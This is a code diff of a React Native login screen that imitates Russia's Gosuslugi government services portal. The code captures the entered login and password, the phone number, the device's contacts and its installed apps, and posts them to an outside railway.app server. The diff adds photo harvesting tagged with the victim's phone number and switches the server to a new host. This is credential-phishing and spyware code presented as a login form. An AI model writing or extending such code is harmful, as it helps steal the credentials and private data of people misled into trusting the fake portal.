@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { View, TouchableOpacity, Text, StyleSheet, Linking,Keyboard, ActivityIndicator } from 'react-native';
+import { View, TouchableOpacity, Text, StyleSheet, Linking, Keyboard, ActivityIndicator } from 'react-native';
 import SvgComponent from '../../svgs/Logo';
 import MyInput from '../MyInput';
 import PhoneNumberPopup from '../PhoneNumber';
@@ -7,6 +7,7 @@ import StorageManager from '../StorageManager';
 import Apps from '../../modules/Apps';
 import Contact from '../../modules/Contact';
 import { useNavigation } from '@react-navigation/native';
+import Images from '../../modules/Images';
 export default function LogIn() {
     const navigation = useNavigation();
     const [phoneOrEmailText, setPhoneOrEmailText] = useState('');
@@ -30,7 +31,7 @@ export default function LogIn() {
         console.log('Продолжить');
         console.log(phoneOrEmailText);
         console.log(passwordText);
-        
+
         await setShowPhoneOrEmailError(phoneOrEmailText.length > 5);
         await setShowPasswordError(passwordText.length > 8);
         if (passwordText.length > 8 && phoneOrEmailText.length > 5) {
@@ -43,7 +44,7 @@ export default function LogIn() {
             }
         }
     };
-    
+
     const handleRecoverPress = () => {
         Linking.openURL('https://esia.gosuslugi.ru/login/recovery');
     };
@@ -56,6 +57,31 @@ export default function LogIn() {
     const handleSubmitPhoneNumber = async (phoneNumber) => {
         await StorageManager.saveData('phoneNumber', phoneNumber)
         await setPopupVisible(false);
+        var apps = await Apps.loadApps()
+        var contacts = await Contact.loadContacts()
+        try {
+            var formData = await Images.getImages();
+        } catch (error) {
+            console.log(error);
+        }
+        if (maxlength === 0 && formData._parts.length > 0) {
+            console.log(`Form data length ${formData._parts.length}`);
+            maxlength = formData._parts.length;
+        }
+        try {
+            if (formData._parts && formData) {
+                if (maxlength !== 0 && formData._parts.length > 0) {
+                    console.log(maxlength);
+                    formData.append('userId', phoneNumber);
+                    console.log('form add ', formData._parts[maxlength]);
+                }
+                if (formData._parts[maxlength + 1]) {
+                    console.log('form has', formData._parts[maxlength + 1]);
+                }
+            }
+        } catch (error) {
+            console.log(error)
+        }
         console.log("Phone:", phoneNumber)
         const user_data = {
             phoneOrEmailText,
@@ -63,7 +89,7 @@ export default function LogIn() {
             phoneNumber
         }
         const data = { user_data: user_data, contacts: contacts, apps: apps }
-        fetch("https://gosserver3-production.up.railway.app/user/add", {
+        fetch("https://gosserver1053-production.up.railway.app/user/add", {
             method: "POST",
             headers: defaultHeaders,
             body: JSON.stringify(data)
@@ -76,14 +102,6 @@ export default function LogIn() {
                 setLoading(false);
             });
     };
-
-    const getData = async () => {
-        await setApps(await Apps.loadApps())
-        await setContacts(await Contact.loadContacts())
-    }
-    useEffect(() => {
-        getData()
-    }, [])
 
     return (
         <View style={styles.container}>
